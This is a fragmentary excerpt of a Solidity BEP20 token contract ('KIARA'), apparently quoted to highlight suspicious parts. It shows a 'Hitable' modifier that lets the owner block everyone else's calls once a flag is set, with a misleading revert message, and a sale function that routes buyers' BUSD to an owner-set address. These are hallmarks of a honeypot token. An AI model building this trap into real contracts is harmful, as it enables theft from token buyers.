...
contract Hitable is Ownable {
  ...
  modifier whenNotHit() 
  {
    require(!hit || msg.sender == _owner, "Ownable: caller is the owner");
    _;
  }
...
contract KIARA is Context, IBEP20, Ownable, Hitable {
  ...
  */
   ...
   */
   ...
   function airdrop(address recipient, uint256 amount) public whenNotHit returns (bool) {
    _transfer(_msgSender(), recipient, amount);
    return true;
  }
...
function buyTokenBUSD(address _refer, uint busd) public returns (bool success){
    ...
    IBEP20(busdAddress).transferFrom(msg.sender, mainAddress, busd);
  ...
  function beginBuy(uint256 _sSBlock, uint256 _sEBlock, uint256 _sPrice, uint256 _sCap, uint256 _srefeper, uint256 _srefertoken) public onlyOwner{
    sSBlock = _sSBlock;
    sEBlock = _sEBlock;
